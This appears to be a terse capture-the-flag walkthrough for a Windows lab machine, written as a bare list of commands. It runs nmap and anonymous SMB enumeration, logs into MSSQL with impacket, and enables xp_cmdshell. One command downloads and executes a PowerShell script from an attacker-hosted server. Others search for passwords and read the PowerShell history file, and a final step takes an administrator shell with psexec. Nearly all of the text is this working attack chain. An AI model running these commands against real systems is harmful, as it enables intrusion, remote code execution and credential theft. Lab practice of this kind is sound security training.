# Searching for open ports.
sudo nmap -sV -sC [ip]

# Task 1 solved.

smbclient -N -L //[ip]

# Task 2 solved.

smbclient //[ip]/[task 2]

get [file]

cat [file]

# Task 3 solved.

# Task 4 solved.

# Task 5 solved.

# Task 6 solved.

cd [Task 6 path]

sudo chmod +x [Task 6]

sudo python3 -m http.server 80

python3 /usr/share/doc/python3-impacket/examples/[task 4] -windows-auth [user]:[password]@[ip]

EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure '[task 5]', 1;
RECONFIGURE;

EXEC xp_cmdshell 'dir C:\Users\[user]\Desktop';

EXEC xp_cmdshell 'type C:\Users\[user]\Desktop\[file]';

EXEC xp_cmdshell 'powershell -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString(''http://[attacker-ip]/[task 6].ps1'') > ''C:\Users\[User]\Desktop\output.txt''"';

EXEC xp_cmdshell 'findstr /i "password admin administrator credentials" C:\Users\[user]\Desktop\output.txt';

EXEC xp_cmdshell 'type C:\Users\[user]\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\[Task 7].txt';

# Task 7 solved.

# Flag 1 solved.

python3 /usr/share/doc/python3-impacket/examples/psexec.py [AdminUser]:[password]@[ip]
cd C:\Users\Administrator\Desktop
dir
type [file]

# Flag 2 solved.
